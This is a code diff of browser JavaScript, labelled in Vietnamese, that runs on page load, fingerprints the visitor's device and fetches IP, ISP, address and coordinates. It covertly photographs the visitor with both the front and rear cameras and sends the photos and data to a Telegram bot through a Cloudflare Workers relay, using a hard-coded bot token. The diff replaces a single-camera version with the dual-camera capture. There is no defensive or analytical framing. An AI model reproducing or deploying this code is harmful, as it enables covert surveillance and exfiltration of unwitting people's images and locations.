@@ -86,8 +86,7 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
 const TELEGRAM_CHAT_ID = '6956722046';
-const API_SEND_PHOTO = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 
 const info = {
   time: new Date().toLocaleString(),
@@ -97,38 +96,30 @@ const info = {
   country: '',
   lat: '',
   lon: '',
-  deviceType: '',
-  deviceModel: '',
-  browser: '',
+  device: '',
   os: '',
-  camera: '⏳ Đang kiểm tra camera...'
+  camera: '⏳ Đang kiểm tra...'
 };
 
-function detectDeviceInfo() {
+function detectDevice() {
   const ua = navigator.userAgent;
-
-  // Loại thiết bị
-  info.deviceType = /Mobi|Android/i.test(ua) ? '📱 Thiết bị di động' : '💻 Máy tính';
-
-  // Tên thiết bị gần đúng
-  if (/iPhone/i.test(ua)) {
-    info.deviceModel = 'iPhone';
-  } else if (/iPad/i.test(ua)) {
-    info.deviceModel = 'iPad';
+  if (/iPhone|iPad|iPod/i.test(ua)) {
+    info.device = 'iOS Device';
+    info.os = 'iOS';
   } else if (/Android/i.test(ua)) {
     const match = ua.match(/Android.*; (.+?) Build/);
-    info.deviceModel = match ? match[1] : 'Thiết bị Android';
+    info.device = match ? match[1] : 'Android Device';
+    info.os = 'Android';
   } else if (/Windows NT/i.test(ua)) {
-    info.deviceModel = 'Windows PC';
+    info.device = 'Windows PC';
+    info.os = 'Windows';
   } else if (/Macintosh/i.test(ua)) {
-    info.deviceModel = 'macOS';
+    info.device = 'Mac';
+    info.os = 'macOS';
   } else {
-    info.deviceModel = 'Không xác định';
+    info.device = 'Không xác định';
+    info.os = 'Không rõ';
   }
-
-  // Trình duyệt và OS
-  info.browser = navigator.userAgentData?.brands?.[0]?.brand || navigator.vendor || 'Không rõ';
-  info.os = navigator.userAgentData?.platform || navigator.platform || 'Không rõ';
 }
 
 function getIPInfo() {
@@ -144,77 +135,103 @@ function getIPInfo() {
     });
 }
 
-function getMessageText() {
+function getCaption() {
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
 🕒 Thời gian: ${info.time}
-📲 Thiết bị: ${info.deviceModel}
-📱 Loại: ${info.deviceType}
-🌐 Trình duyệt: ${info.browser}
+📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
-🌍 Quốc gia: ${info.country}
-🏙️ Địa chỉ: ${info.address}
 🌐 IP: ${info.ip}
 🏢 ISP: ${info.isp}
+🏙️ Địa chỉ: ${info.address}
+🌍 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
-📷 Camera: ${info.camera}
-  `.trim();
+📸 Camera: ${info.camera}
+`.trim();
 }
 
-function sendOnlyText() {
-  fetch(API_SEND_TEXT, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: getMessageText()
-    })
+function captureCamera(facingMode = "user") {
+  return new Promise((resolve, reject) => {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+      .then(stream => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
+          }, 1000);
+        };
+      })
+      .catch(err => reject(err));
   });
 }
 
-function captureCameraAndSend() {
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(stream => {
-      info.camera = '✅ Đã mở camera';
+async function sendTwoPhotosAsMediaGroup(frontBlob, backBlob) {
+  const formData = new FormData();
 
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
+  // Đặt 2 file ảnh
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('media', JSON.stringify([
+    {
+      type: 'photo',
+      media: 'attach://front',
+      caption: getCaption()
+    },
+    {
+      type: 'photo',
+      media: 'attach://back'
+    }
+  ]));
 
-      video.onloadedmetadata = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
+  formData.append('front', frontBlob, 'front.jpg');
+  formData.append('back', backBlob, 'back.jpg');
 
-        setTimeout(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          stream.getTracks().forEach(track => track.stop());
-
-          canvas.toBlob(blob => {
-            getIPInfo().then(() => {
-              const formData = new FormData();
-              formData.append('chat_id', TELEGRAM_CHAT_ID);
-              formData.append('photo', blob, 'camera.jpg');
-              formData.append('caption', getMessageText());
-
-              fetch(API_SEND_PHOTO, {
-                method: 'POST',
-                body: formData
-              });
-            });
-          }, 'image/jpeg', 0.9);
-        }, 1000);
-      };
-    })
-    .catch(() => {
-      info.camera = '📵 Không cho phép hoặc lỗi camera';
-      getIPInfo().then(sendOnlyText);
-    });
+  return fetch(API_SEND_MEDIA, {
+    method: 'POST',
+    body: formData
+  });
 }
 
-// ▶️ Bắt đầu thực thi
-detectDeviceInfo();
-captureCameraAndSend();
+async function main() {
+  detectDevice();
+
+  let frontBlob = null, backBlob = null;
+  try {
+    frontBlob = await captureCamera("user");
+    backBlob = await captureCamera("environment");
+    info.camera = '✅ Đã chụp cả 2 camera';
+  } catch (e) {
+    info.camera = '📵 Không thể truy cập đủ camera';
+  }
+
+  await getIPInfo();
+
+  if (frontBlob && backBlob) {
+    await sendTwoPhotosAsMediaGroup(frontBlob, backBlob);
+  } else {
+    // Chỉ gửi text nếu không có ảnh
+    fetch(`https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: getCaption()
+      })
+    });
+  }
+}
+
+// ▶️ Khởi chạy
+main();
